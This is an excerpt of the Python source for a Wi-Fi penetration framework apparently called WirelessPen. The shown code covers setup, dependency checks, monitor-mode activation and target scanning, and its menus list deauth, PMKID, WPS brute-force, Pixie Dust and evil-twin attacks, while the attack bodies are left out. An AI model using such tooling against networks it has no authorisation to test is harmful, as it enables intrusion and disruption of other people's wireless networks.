...
def run_command(cmd: str, shell: bool = True, capture: bool = True, timeout: int = 30) -> Tuple[int, str, str]:
    """
...
def check_root():
    ...
    if os.geteuid() != 0:
        ...
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Please run: {Colors.CYAN}sudo python3 {sys.argv[0]}{Colors.RESET}")
        sys.exit(1)
...
def check_python_version():
    ...
    if current < required:
        print(f"{Colors.RED}[!]{Colors.RESET} Python {MIN_PYTHON_VERSION}+ required. Current: {current_version}")
        sys.exit(1)
...
def signal_handler(sig, frame):
    ...
    print(f"{Colors.YELLOW}║{Colors.WHITE}                           INTERRUPTION DETECTED                              {Colors.YELLOW}║{Colors.RESET}")
...
def cleanup_exit(exit_code: int = 0):
    ...
    if state.processes:
        print(f"  {Colors.ARROW} Terminating {len(state.processes)} background process(es)...")
        for proc in state.processes[:]:  # Copy list to avoid modification during iteration
            try:
                if proc.poll() is None:  # Process still running
                    kill_process_group(proc)
            except Exception as e:
                if state.verbose_mode:
                    print(f"    {Colors.GRAY}[DEBUG] Error killing process: {e}{Colors.RESET}")
    ...
    if state.temp_files:
        ...
        for temp_file in state.temp_files:
            try:
                ...
                if state.verbose_mode:
                    print(f"    {Colors.GRAY}[DEBUG] Error removing {temp_file}: {e}{Colors.RESET}")
    
    # Remove common temporary files from current directory
    temp_patterns = [
        "Captura*", "myHashes*", "replay_*", ".cap", ".csv", 
        "handshake_*", "pmkid_*", "wps_*", "scan_*"
    ]
    ...
    run_command("systemctl start NetworkManager 2>/dev/null || service NetworkManager start 2>/dev/null", timeout=10)
    run_command("systemctl start wpa_supplicant 2>/dev/null || service wpa_supplicant start 2>/dev/null", timeout=10)
    ...
    if state.target_network:
        print(f"  Target:         {state.target_network.get('essid', 'Unknown')} ({state.target_network.get('bssid', 'Unknown')})")
...
def show_banner():
    ...
    print(f"{Colors.CYAN}║{Colors.BLUE}  ██     ██ ██ ██████  ███████ ██      ███████ ███████ ███████  {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.BLUE}  ██     ██ ██ ██   ██ ██      ██      ██      ██      ██       {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.BLUE}  ██  █  ██ ██ ██████  █████   ██      █████   ███████ ███████  {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.BLUE}  ██ ███ ██ ██ ██   ██ ██      ██      ██           ██      ██  {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.BLUE}   ███ ███  ██ ██   ██ ███████ ███████ ███████ ███████ ███████  {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                                                                  {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}              📡 Wireless Penetration Framework v{SCRIPT_VERSION}             {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.PURPLE}                    {SCRIPT_BUILD}                     {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.GRAY}                        by {SCRIPT_AUTHOR}                           {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}")
...
def show_quick_help():
    ...
    print(f"  {Colors.WHITE}wirelesspen{Colors.RESET} {Colors.CYAN}<attack>{Colors.RESET} [{Colors.GREEN}options{Colors.RESET}]")
    ...
    print(f"  {Colors.WHITE}wirelesspen{Colors.RESET} {Colors.GREEN}handshake{Colors.RESET} {Colors.CYAN}-i{Colors.RESET} wlan0")
    print(f"  {Colors.WHITE}wirelesspen{Colors.RESET} {Colors.GREEN}pmkid{Colors.RESET} {Colors.CYAN}--scan{Colors.RESET}")
    print(f"  {Colors.WHITE}wirelesspen{Colors.RESET} {Colors.GREEN}wps{Colors.RESET} {Colors.CYAN}-t{Colors.RESET} AA:BB:CC:DD:EE:FF")
    print()

def show_disclaimer() -> bool:
    """Display legal disclaimer and get user agreement."""
    print(f"{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.RED}║{Colors.YELLOW}                                  DISCLAIMER                                   {Colors.RED}║{Colors.RESET}")
    print(f"{Colors.RED}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  LEGAL NOTICE:{Colors.RESET}")
    print("   This tool is intended for educational purposes and authorized security testing only.")
    print("   Unauthorized access to networks is illegal and may result in criminal prosecution.")
    print()
    ...
    print()
    print(f"{Colors.RED}🔒 By using this tool, you agree to use it responsibly and legally.{Colors.RESET}")
    print()
    
    response = input(f"{Colors.YELLOW}[?]{Colors.RESET} Do you agree to these terms and conditions? [{Colors.GREEN}Y{Colors.RESET}/{Colors.RED}n{Colors.RESET}]: ").strip()
...
def show_version():
    ...
    print(f"{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                             VERSION INFORMATION                             {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    ...
    print(f"{Colors.YELLOW}Build Date:{Colors.RESET:<20} {datetime.now().strftime('%Y-%m-%d')}")
    print()
    
    # Dependencies Status
    print(f"{Colors.YELLOW}📦 DEPENDENCIES STATUS:{Colors.RESET}")
    deps = ["aircrack-ng", "macchanger", "iwconfig", "hcxdumptool", "hashcat", "ethtool"]
    ...
    print(f" {'OS:':<15} {subprocess.getoutput('lsb_release -d 2>/dev/null | cut -f2') or platform.system()}")
    ...
    print(f" {Colors.GREEN}v2.2.0{Colors.RESET} - Rebranded to WirelessPen + Universal wireless support")
    print(f" {Colors.GREEN}v2.0.5{Colors.RESET} - Added PKMID attack infrastructure")
    print(f" {Colors.GREEN}v2.0.0{Colors.RESET} - Complete Python rewrite with advanced features")
    print()
...
def show_help():
    ...
    print(f"{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                                 HELP & USAGE                                 {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    # Usage Synopsis
    print(f"{Colors.YELLOW}📖 SYNOPSIS:{Colors.RESET}")
    print(f"   {Colors.BOLD}{sys.argv[0]}{Colors.RESET} {Colors.CYAN}[OPTIONS]{Colors.RESET}")
    print()
    
    # Command Line Options
    print(f"{Colors.YELLOW}⚙️  COMMAND LINE OPTIONS:{Colors.RESET}")
    print(f"{Colors.CYAN}╭─────────────────────────────────────────────────────────────────────────────────╮{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {'FLAG':<4} {'PARAMETER':<20} {'DESCRIPTION':<51} {Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}├─────────────────────────────────────────────────────────────────────────────────┤{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {'-a':<4} {'<attack_mode>':<20} {'Attack type: Handshake or PKMID':<51} {Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {'-n':<4} {'<interface>':<20} {'Network interface (optional, auto-detected)':<51} {Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {'-l':<4} {'':<20} {'List available network interfaces':<51} {Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {'-t':<4} {'':<20} {'WiFi diagnostics and repair toolkit':<51} {Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {'-v':<4} {'':<20} {'Display version information':<51} {Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {'-h':<4} {'':<20} {'Show this help panel':<51} {Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}╰─────────────────────────────────────────────────────────────────────────────────╯{Colors.RESET}\n")
    
    # Attack Modes
    print(f"{Colors.YELLOW}🎯 ATTACK MODES:{Colors.RESET}")
    print(f"{Colors.GREEN}╭─────────────────────────────────────────────────────────────────────────────────╮{Colors.RESET}")
    print(f"{Colors.GREEN}│{Colors.RESET} {'MODE':<15} {'DESCRIPTION':<62} {Colors.GREEN}│{Colors.RESET}")
    print(f"{Colors.GREEN}├─────────────────────────────────────────────────────────────────────────────────┤{Colors.RESET}")
    print(f"{Colors.GREEN}│{Colors.RESET} {'handshake':<15} {'Capture WPA/WPA2 4-way handshake via deauthentication':<62} {Colors.GREEN}│{Colors.RESET}")
    print(f"{Colors.GREEN}│{Colors.RESET} {'pmkid_hashcat':<15} {'PMKID clientless attack optimized for Hashcat':<62} {Colors.GREEN}│{Colors.RESET}")
    print(f"{Colors.GREEN}│{Colors.RESET} {'wps':<15} {'WPS PIN brute force attack':<62} {Colors.GREEN}│{Colors.RESET}")
    print(f"{Colors.GREEN}│{Colors.RESET} {'pixie':<15} {'Pixie Dust WPS vulnerability (CVE-2014-4910)':<62} {Colors.GREEN}│{Colors.RESET}")
    print(f"{Colors.GREEN}│{Colors.RESET} {'evil_twin':<15} {'Rogue access point attack (authorization required)':<62} {Colors.GREEN}│{Colors.RESET}")
    print(f"{Colors.GREEN}│{Colors.RESET} {'deauth':<15} {'Mass deauthentication flood attack':<62} {Colors.GREEN}│{Colors.RESET}")
    print(f"{Colors.GREEN}╰─────────────────────────────────────────────────────────────────────────────────╯{Colors.RESET}\n")
    ...
    print(f" {Colors.GREEN}✓{Colors.RESET} TP-Link AC/N series (T2U, T3U, T4U, TL-WN725N)")
    print(f" {Colors.GREEN}✓{Colors.RESET} Realtek RTL8812AU/RTL8821AU/RTL8188EU series")
    ...
    # Footer
    print(f"{Colors.GRAY}{Colors.DIM}For bug reports and feature requests, visit: {SCRIPT_GITHUB}{Colors.RESET}")
    print(f"{Colors.GRAY}{Colors.DIM}Licensed under {SCRIPT_LICENSE} License. Use responsibly and legally.{Colors.RESET}\n")
...
def detect_wireless_cards() -> List[str]:
    ...
    print(f"{Colors.CYAN}║{Colors.WHITE}                📡 WIRELESSPEN - WIRELESS CARD DETECTION                  {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}🔍 Scanning for wireless network interfaces...{Colors.RESET}")
    
    # Detect wireless cards
    code, output, _ = run_command("iwconfig 2>/dev/null | grep -oP '^[a-zA-Z0-9]+(?=\\s+IEEE 802.11)'")
    ...
    if not wireless_cards:
        ...
        code, interfaces, _ = run_command("ip link show | grep -E '^[0-9]+:' | awk -F': ' '{print $2}' | grep -v lo | tr -d '@'")
        
        if interfaces.strip():
            for iface in interfaces.strip().split('\n'):
                code, driver, _ = run_command(f"ethtool -i {iface} 2>/dev/null | grep 'driver:' | awk '{{print $2}}'")
                driver = driver.strip() or "unknown"
                code, status, _ = run_command(f"ip link show {iface} | grep -o 'state [A-Z]*' | awk '{{print $2}}'")
                status = status.strip() or "UNKNOWN"
                print(f"   {Colors.PURPLE}•{Colors.RESET} {Colors.BLUE}{iface}{Colors.RESET} {Colors.GRAY}(Driver: {driver}, Status: {status}){Colors.RESET}")
            print()
        
        # Troubleshooting guide
        print(f"{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.YELLOW}                            TROUBLESHOOTING GUIDE                            {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        print(f"{Colors.YELLOW}🔧 Possible causes and solutions:{Colors.RESET}")
        print(f" {Colors.PURPLE}1){Colors.RESET} Wireless card not recognized as 802.11 device")
        print(f"    {Colors.GRAY}→ Try: {Colors.CYAN}sudo iwconfig{Colors.RESET} to check manual detection")
        print(f" {Colors.PURPLE}2){Colors.RESET} Driver incompatible or not installed")
        print(f"    {Colors.GRAY}→ Use: {Colors.CYAN}{sys.argv[0]} -t{Colors.RESET} for WiFi diagnostics")
        print(f" {Colors.PURPLE}3){Colors.RESET} Card in incompatible mode or disabled")
        print(f"    {Colors.GRAY}→ Try: {Colors.CYAN}sudo rfkill unblock wifi{Colors.RESET}")
        print(f" {Colors.PURPLE}4){Colors.RESET} USB device needs replug or power cycle")
        print(f"    {Colors.GRAY}→ Disconnect and reconnect the USB adapter")
        print()
        
        sys.exit(1)
    
    print(f" {Colors.GREEN}✓{Colors.RESET} Found {len(wireless_cards)} wireless interface(s)\n")
    
    print(f"{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.GREEN}║{Colors.WHITE}                          AVAILABLE WIRELESS CARDS                          {Colors.GREEN}║{Colors.RESET}")
    print(f"{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    for i, card in enumerate(wireless_cards, 1):
        # Get card information
        code, driver, _ = run_command(f"ethtool -i {card} 2>/dev/null | grep 'driver:' | awk '{{print $2}}'")
        driver = driver.strip() or "unknown"
        
        code, mac, _ = run_command(f"ip link show {card} 2>/dev/null | grep 'link/ether' | awk '{{print $2}}'")
        mac = mac.strip() or "N/A"
        
        code, ssid, _ = run_command(f"iwconfig {card} 2>/dev/null | grep 'ESSID:' | awk -F'\"' '{{print $2}}'")
        ssid = ssid.strip()
        ...
        code, monitor, _ = run_command(f"iw {card} info 2>/dev/null | grep -q monitor && echo 'yes' || echo 'no'")
        monitor_support = f"{Colors.GREEN}✓ Monitor Mode{Colors.RESET}" if "yes" in monitor else f"{Colors.RED}✗ No Monitor{Colors.RESET}"
        
        code, power, _ = run_command(f"iwconfig {card} 2>/dev/null | grep -o 'Tx-Power=[0-9]*' | cut -d= -f2")
        power = power.strip() or "N/A"
        
        print(f"{Colors.PURPLE}┌─ Interface {Colors.WHITE}#{i}{Colors.RESET}")
        print(f"{Colors.PURPLE}│{Colors.RESET}")
        print(f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}Interface:{Colors.RESET} {Colors.CYAN}{card}{Colors.RESET}")
        print(f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}Driver:{Colors.RESET} {Colors.BLUE}{driver}{Colors.RESET}")
        print(f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}MAC Address:{Colors.RESET} {Colors.WHITE}{mac}{Colors.RESET}")
        print(f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}Status:{Colors.RESET} {status}")
        print(f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}Monitor Mode:{Colors.RESET} {monitor_support}")
        print(f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}TX Power:{Colors.RESET} {Colors.YELLOW}{power} dBm{Colors.RESET}")
        print(f"{Colors.PURPLE}└─{Colors.RESET} {Colors.BOLD}Capabilities:{Colors.RESET} {Colors.GRAY}802.11 Wireless{Colors.RESET}")
        print()
...
def select_network_card(specified_card: Optional[str] = None) -> str:
    ...
    if specified_card:
        ...
        if code == 0:
            print(f"{Colors.GREEN}[+]{Colors.RESET} Using specified card: {Colors.BLUE}{specified_card}{Colors.RESET}\n")
            return specified_card
        else:
            print(f"{Colors.RED}[!]{Colors.RESET} Specified card '{specified_card}' is not valid or not wireless\n")
    
    wireless_cards = detect_wireless_cards()
    
    if len(wireless_cards) == 1:
        card = wireless_cards[0]
        print(f"{Colors.GREEN}[+]{Colors.RESET} Only one card available: {Colors.BLUE}{card}{Colors.RESET}")
        confirm = input(f"{Colors.YELLOW}[*]{Colors.RESET} Continue with this card? [Y/n]: ").strip()
        
        if confirm.lower() == 'n':
            print(f"{Colors.RED}[!]{Colors.RESET} Operation cancelled by user\n")
            sys.exit(0)
        
        print(f"{Colors.GREEN}[+]{Colors.RESET} Using card: {Colors.BLUE}{card}{Colors.RESET}\n")
        return card
    
    while True:
        selection = input(f"{Colors.YELLOW}[*]{Colors.RESET} Select a network card [1-{len(wireless_cards)}] or 'r' to refresh: ").strip()
        ...
        try:
            ...
            if 0 <= index < len(wireless_cards):
                ...
                code, driver, _ = run_command(f"ethtool -i {card} 2>/dev/null | grep 'driver:' | awk '{{print $2}}'")
                driver = driver.strip() or "Unknown"
                print(f"\t{Colors.PURPLE}Interface:{Colors.RESET} {Colors.BLUE}{card}{Colors.RESET}")
                print(f"\t{Colors.PURPLE}Driver:{Colors.RESET} {driver}")
                
                confirm = input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Confirm selection? [Y/n]: ").strip()
                
                if confirm.lower() != 'n':
                    print(f"{Colors.GREEN}[+]{Colors.RESET} Card confirmed: {Colors.BLUE}{card}{Colors.RESET}\n")
                    return card
                
                print(f"{Colors.YELLOW}[*]{Colors.RESET} Select another card...\n")
            else:
                print(f"{Colors.RED}[!]{Colors.RESET} Invalid selection. Choose 1-{len(wireless_cards)} or 'r'\n")
        except ValueError:
            print(f"{Colors.RED}[!]{Colors.RESET} Invalid input. Enter a number or 'r'\n")
...
def wifi_diagnostic():
    ...
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                📡 WIRELESSPEN - WIRELESS ADAPTER DIAGNOSTICS             {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    if not state.network_card:
        print(f"{Colors.RED}[!]{Colors.RESET} No se ha seleccionado ninguna tarjeta de red")
        return False
    ...
    print(f"{Colors.YELLOW}[1/8]{Colors.RESET} {Colors.BOLD}Información de la Interfaz:{Colors.RESET}")
    ...
    if code == 0:
        ...
        print(f"  {Colors.RED}✗{Colors.RESET} No se pudo obtener información de la interfaz")
    ...
    if code == 0 and driver_info:
        ...
        print(f"  {Colors.RED}✗{Colors.RESET} No se pudo obtener información del driver")
    ...
    if code == 0 and usb_output.strip():
        ...
        print(f"  {Colors.YELLOW}⚠{Colors.RESET} No se detectaron adaptadores WiFi USB o es un adaptador interno")
    
    # 4. Módulos del kernel cargados
    print(f"\n{Colors.YELLOW}[4/8]{Colors.RESET} {Colors.BOLD}Módulos del Kernel:{Colors.RESET}")
    code, modules, _ = run_command("lsmod | grep -E '^(rtl|mt7|ath|iwl|brcm|b43|carl|ar9|rt2)' | head -10")
    ...
    code, capabilities, _ = run_command(f"iw list 2>/dev/null | grep -A 10 'Supported interface modes'")
    if code == 0 and capabilities.strip():
        ...
        print(f"  {Colors.YELLOW}⚠{Colors.RESET} No se pudo obtener información de capacidades")
    ...
    code, monitor_check, _ = run_command(f"iwconfig {interface} 2>/dev/null | grep -i monitor")
    ...
    code, processes, _ = run_command("ps aux | grep -iE 'network-manager|wpa_supplicant|dhclient' | grep -v grep")
    if code == 0 and processes.strip():
        print(f"  {Colors.YELLOW}⚠{Colors.RESET} Procesos detectados que pueden interferir:")
        for line in processes.strip().split('\n')[:5]:
            if line.strip():
                print(f"    {line[:100]}...")
    else:
        print(f"  {Colors.GREEN}✓{Colors.RESET} No se detectaron procesos interferentes")
    
    # Resumen del diagnóstico
    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
    if diagnostic_success:
        print(f"{Colors.GREEN}✓{Colors.RESET} {Colors.BOLD}Diagnóstico completado exitosamente{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}⚠{Colors.RESET} {Colors.BOLD}Diagnóstico completado con advertencias{Colors.RESET}")
...
def check_dependencies() -> bool:
    ...
    """
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                    📦 DEPENDENCY VERIFICATION SYSTEM                      {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    # Enhanced dependency definitions with versions and packages
    dependencies = {
        'core': {
            'aircrack-ng': {'cmd': 'aircrack-ng', 'pkg': 'aircrack-ng', 'min_version': '1.5', 'critical': True},
            'airodump-ng': {'cmd': 'airodump-ng', 'pkg': 'aircrack-ng', 'min_version': '1.5', 'critical': True},
            'aireplay-ng': {'cmd': 'aireplay-ng', 'pkg': 'aircrack-ng', 'min_version': '1.5', 'critical': True},
            'airmon-ng': {'cmd': 'airmon-ng', 'pkg': 'aircrack-ng', 'min_version': '1.5', 'critical': True},
            'iwconfig': {'cmd': 'iwconfig', 'pkg': 'wireless-tools', 'min_version': '30', 'critical': True},
            'iw': {'cmd': 'iw', 'pkg': 'iw', 'min_version': '5.0', 'critical': True},
            'macchanger': {'cmd': 'macchanger', 'pkg': 'macchanger', 'min_version': '1.7', 'critical': True},
            'ethtool': {'cmd': 'ethtool', 'pkg': 'ethtool', 'min_version': '5.0', 'critical': True},
        },
        'wps': {
            'reaver': {'cmd': 'reaver', 'pkg': 'reaver', 'min_version': '1.6', 'critical': False},
            'wash': {'cmd': 'wash', 'pkg': 'reaver', 'min_version': '1.6', 'critical': False},
            'bully': {'cmd': 'bully', 'pkg': 'bully', 'min_version': '1.1', 'critical': False},
        },
        'pmkid': {
            'hcxdumptool': {'cmd': 'hcxdumptool', 'pkg': 'hcxtools', 'min_version': '6.0', 'critical': False},
            'hcxpcapngtool': {'cmd': 'hcxpcapngtool', 'pkg': 'hcxtools', 'min_version': '6.0', 'critical': False},
            'hashcat': {'cmd': 'hashcat', 'pkg': 'hashcat', 'min_version': '6.0', 'critical': False},
        },
        'evil_twin': {
            'hostapd': {'cmd': 'hostapd', 'pkg': 'hostapd', 'min_version': '2.9', 'critical': False},
            'dnsmasq': {'cmd': 'dnsmasq', 'pkg': 'dnsmasq', 'min_version': '2.80', 'critical': False},
        }
    }
    ...
    for category, tools in dependencies.items():
        ...
        for tool_name, tool_info in tools.items():
            ...
            if code == 0:
                ...
                print(f"  {Colors.SUCCESS} {tool_name:<15} {Colors.GREEN}v{version}{Colors.RESET} {Colors.GRAY}({cmd}){Colors.RESET}")
            else:
                if critical:
                    print(f"  {Colors.FAILURE} {tool_name:<15} {Colors.RED}Missing{Colors.RESET} {Colors.GRAY}({pkg}){Colors.RESET}")
                    missing_critical.append(tool_name)
                    category_available = False
                else:
                    print(f"  {Colors.WARNING} {tool_name:<15} {Colors.YELLOW}Optional{Colors.RESET} {Colors.GRAY}({pkg}){Colors.RESET}")
    ...
    if current_py >= min_py:
        print(f"  {Colors.SUCCESS} Python         {Colors.GREEN}{py_version}{Colors.RESET}")
    else:
        print(f"  {Colors.FAILURE} Python         {Colors.RED}{py_version} (need {MIN_PYTHON_VERSION}+){Colors.RESET}")
    ...
    if platform.system() == 'Linux':
        ...
        if os.geteuid() == 0:
            ...
            print(f"  {Colors.FAILURE} Privileges     {Colors.RED}Non-root (required){Colors.RESET}")
            missing_critical.append('root_privileges')
    else:
        print(f"  {Colors.WARNING} Operating System {Colors.YELLOW}{platform.system()} (Linux recommended){Colors.RESET}")
    
    print()
    
    # Results summary
    print(f"{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                           DEPENDENCY CHECK RESULTS                          {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    if missing_critical:
        print(f"{Colors.FAILURE} {Colors.RED}CRITICAL DEPENDENCIES MISSING:{Colors.RESET}")
        ...
        print(f"  sudo apt update && sudo apt install -y aircrack-ng wireless-tools iw macchanger ethtool")
    ...
    print(f"{Colors.SUCCESS} {Colors.GREEN}ALL CRITICAL DEPENDENCIES SATISFIED{Colors.RESET}\n")
    
    if available_features:
        print(f"{Colors.INFO} {Colors.CYAN}Available features:{Colors.RESET} {', '.join(available_features)}")
    
    if missing_optional:
        print(f"{Colors.WARNING} {Colors.YELLOW}Optional tools missing:{Colors.RESET} {', '.join(missing_optional)}")
...
def handle_monitor_mode() -> bool:
    ...
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                      📡 MONITOR MODE ACTIVATION                            {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    print(f"{Colors.INFO} Target interface: {Colors.CYAN}{interface}{Colors.RESET}")
    
    # Check if already in monitor mode
    code, monitor_check, _ = run_command(f"iwconfig {interface} 2>/dev/null | grep -i monitor", timeout=10)
    if code == 0 and monitor_check.strip():
    ...
    code, modes, _ = run_command(f"iw phy$(iw {interface} info | grep wiphy | awk '{{print $2}}') info 2>/dev/null | grep -A 10 'Supported interface modes'", timeout=10)
    ...
    interfering_processes = [
        ...
        'wpa_cli', 'dhcpcd', 'avahi-daemon'
    ]
    
    for process in interfering_processes:
        run_command(f"systemctl stop {process} 2>/dev/null || service {process} stop 2>/dev/null || killall {process} 2>/dev/null", timeout=5)
    ...
    print(f"{Colors.YELLOW}[5/5]{Colors.RESET} Method 3: airmon-ng automated approach...")
    ...
    for test_interface in possible_interfaces:
        code, monitor_check, _ = run_command(f"iwconfig {test_interface} 2>/dev/null | grep -i monitor", timeout=5)
        if code == 0 and monitor_check.strip():
            print(f"{Colors.SUCCESS} Monitor mode enabled using airmon-ng")
            print(f"{Colors.INFO} Monitor interface: {Colors.CYAN}{test_interface}{Colors.RESET}")
            ...
            if test_interface != interface:
                print(f"{Colors.WARNING} Interface name changed: {interface} → {test_interface}")
    ...
    print(f"    {Colors.GRAY}iw phy$(iw {interface} info | grep wiphy | awk '{{print $2}}') info{Colors.RESET}")
...
def scan_networks(scan_time: int = None, target_channel: str = None) -> Optional[Dict[str, str]]:
    """
    ...
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                        📡 ADVANCED NETWORK SCANNER                        {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    ...
    try:
        ...
        for i in range(scan_duration):
            ...
            print(f"\r{Colors.CYAN}[{progress:5.1f}%]{Colors.RESET} Scanning{dots:<4} ({i+1}/{scan_duration}s)", end='', flush=True)
            time.sleep(1)
    ...
    if not networks:
        ...
        print(f"  • Try different channels: {Colors.CYAN}--channel 1,6,11{Colors.RESET}")
    ...
    print(f"{Colors.CYAN}╭─────┬───────────────────┬────┬──────┬──────────┬─────────────────────────╮{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.BOLD}  #  {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} BSSID             {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} CH {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} PWR  {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} SECURITY {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} ESSID                   {Colors.RESET}{Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}├─────┼───────────────────┼────┼──────┼──────────┼─────────────────────────┤{Colors.RESET}")
    ...
    for i, net in enumerate(networks, 1):
        ...
        print(f"{Colors.CYAN}│{Colors.YELLOW}{i:4} {Colors.RESET}{Colors.CYAN}│{Colors.RESET} {bssid:<17} {Colors.CYAN}│{Colors.RESET} {channel:>2} {Colors.CYAN}│{Colors.RESET} {power_display} {Colors.CYAN}│{Colors.RESET} {enc_color}{encryption:<8}{Colors.RESET} {Colors.CYAN}│{Colors.RESET} {essid:<23} {Colors.CYAN}│{Colors.RESET}")
    ...
    while True:
        try:
            ...
            print(f"  • Enter {Colors.CYAN}'s'{Colors.RESET} to sort by different criteria")
            ...
            if choice == '0':
                ...
                if filter_choice == '1':
                    ...
                    networks = [n for n in networks if int(n.get('power', '-100')) >= -60]
            ...
            try:
                ...
                if 1 <= num_choice <= len(networks):
                    ...
                    confirm = input(f"\n{Colors.YELLOW}Confirm target? [Y/n]: {Colors.RESET}").strip().lower()
                    if confirm != 'n':
                        state.target_network = selected
                        return selected
                else:
                    print(f"{Colors.FAILURE} Invalid selection. Choose 1-{len(networks)}")
            except ValueError:
                print(f"{Colors.FAILURE} Invalid input. Enter a number, 'r', 's', 'f', or '0'")
...
def attack_wps():
    ...
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                    📡 WIRELESSPEN - WPS PIN ATTACK                         {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
...
def attack_pixie():
    ...
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                    📡 WIRELESSPEN - PIXIE DUST ATTACK                     {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
...
def attack_evil_twin():
    ...
    print(f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.WHITE}                    📡 WIRELESSPEN - EVIL TWIN ATTACK                      {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
